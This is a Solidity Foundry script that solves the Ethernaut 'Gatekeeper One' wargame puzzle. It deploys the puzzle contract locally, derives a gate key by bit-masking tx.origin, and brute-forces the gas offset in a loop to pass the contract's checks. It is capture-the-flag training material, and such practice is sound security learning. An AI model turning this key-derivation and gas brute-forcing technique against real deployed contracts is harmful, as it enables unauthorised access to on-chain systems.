// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/GatekeeperOne.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract GatekeeperOneHack is Script {
    using SafeMath for uint256;
    GatekeeperOne public gatekeeper;

    function run() public {
        gatekeeper = new GatekeeperOne();

        bytes8 gatekey = bytes8(
            uint64(uint160(tx.origin) & 0xFFFFFFFF0000FFFF)
        );

        assert(uint32(uint64(gatekey)) == uint16(uint64(gatekey)));
        assert(uint32(uint64(gatekey)) != uint64(gatekey));
        assert(uint16(uint160(tx.origin)) == uint32(uint64(gatekey)));

        uint256 gasAmount;
        for (uint256 i = 0; i <= 8191; i++) {
            gasAmount = 73990 + i;
            try this.gatekeeper().enter{gas: gasAmount}(gatekey) {
                console.log("Pass, Gas:", gasAmount);
            } catch {}
        }

        vm.startPrank(tx.origin);
        this.attack(gatekey, gasAmount);
        vm.stopPrank();

        console.log(gatekeeper.entrant());
    }

    function attack(bytes8 _gateKey, uint256 _gasAmount) external {
        gatekeeper.enter{gas: _gasAmount}(_gateKey);
    }
}
